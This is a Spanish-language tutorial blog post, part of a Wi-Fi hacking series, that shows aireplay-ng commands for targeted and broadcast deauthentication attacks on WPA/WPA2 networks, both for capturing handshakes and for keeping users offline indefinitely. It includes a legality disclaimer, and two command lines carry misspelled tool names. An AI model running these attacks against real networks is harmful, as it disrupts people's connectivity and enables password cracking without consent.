---
layout: single
title: Wifi Hacking 3, Ataques
excerpt: "En este articulo veremos unos cuantos ataques para las redes WPA y WPA 2, los cuales podremos lanzar con distintas finalidades."
date: 2022-07-05
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/Wifi-Hacking/wifi.webp
categories:
  - Wifi-Hacking
tags:  
  - Wifi-Hacking
---

Vale, una vez visto lo anterior ya nos podemos poner manos a la obra con una parte bastante atractiva de esto, los ataques, aquí veremos ataques de varios tipos y como los podemos utilizar con distintos fines, pero antes de nada `YO NO ME HAGO RESPONSABLE DEL MAL USO QUE SE LE PUEDAN DAR A ESTOS CONOCIMIENTOS`, ya que como todo esto se puede usar para el bien, pero también se puede utilizar para el mal y creo que no hace falta aclarar que `Cualquier ataque de estos en una red en la que no tengamos permiso de efectuarlos es completamente ILEGAL`. Una vez aclarado esto ya nos podemos poner manos a la obra. uwu

![](/assets/images/Wifi-Hacking/wifi-hacking.jpg)

`(antes de nada hay que aclarar que todos estos ataques, capturar paquetes y todo eso... se puede hacer sin estar conectados a la red que queremos atacar, es decir que no necesitamos saber la contraseña, solo necesitaremos saberla para snifar la red, ya que la información viaja encriptada y sin la contraseña no podremos verla en texto claro)`

## ATAQUE DE DEAUTENTICACIÓN DIRIGIDO

Con este ataque basicamente `vamos a desconectar a un usuario` de la red que queramos. Si vemos que `los frames estan aumentando, significa que el usuario esta activo` y por lo tanto se va a `reconectar` y ahi podrmemos capturar el `handshake`. Claro, tambien podemos querer que el usuario `no se pueda conectar` entonces podemos desconectarlo continuamente.

```
#Deautenticar / Desconectar a un usuario una vez
> airplay -0 {paquetes que quieres emitirle (por ejemplo 10)} -e {nombre de la red} -c {MAC del cliente} {tarjeta de red en modo monitor}

#Otra forma de hacerlo
> aireplay --deauth 2000 -a {bssid de la red} -c {MAC victima} {tarjeta de red} (esta es 	otra opcion de hacerlo)


# IMPORTANTE: si queremos que ese cliente no se pueda conectar, en el numero de paquetes ponemos 0 y se estaran mandando paquetes de deautenticación uno tras otro hasta que tu hagas Control+C o cierres la consola.
```

Ejemplo:

![](/assets/images/Wifi-Hacking/Deauth-dirigido.PNG)


## ATAQUE DE DEAUTENTICACIÓN GLOBAL

Esto es lo mismo que el anterior pero para desconectar a todos los clientes, de esta forma `es mas probable conseguir uno o varios handshakes`. O tambien se puede utilizar para otros fines.

Para esto reemplazaremos la MAC del cliente victima por la `broadcast MAC: FF:FF:FF:FF:FF:FF` y asi seleccionaremos `todos los clientes` para desconectarlos. Aunque aireplay-ng tiene una facilidad con la cual si no ponemos ninguna MAC, por defecto seleccionara todos los usuarios.

```
#Forma 1
> aireplay-ng -0 10 -e {nombre de la red} -c FF:FF:FF:FF:FF:FF {nombre de la tarjeta de red}

#Forma 2 (la que facilita aireplay)
> aireplay-ng -0 10 -e {nombre de la red} {tarjeta de red}

# IMPORTANTE: aqui tambien podemos hacer que no se puedan reconectar
```






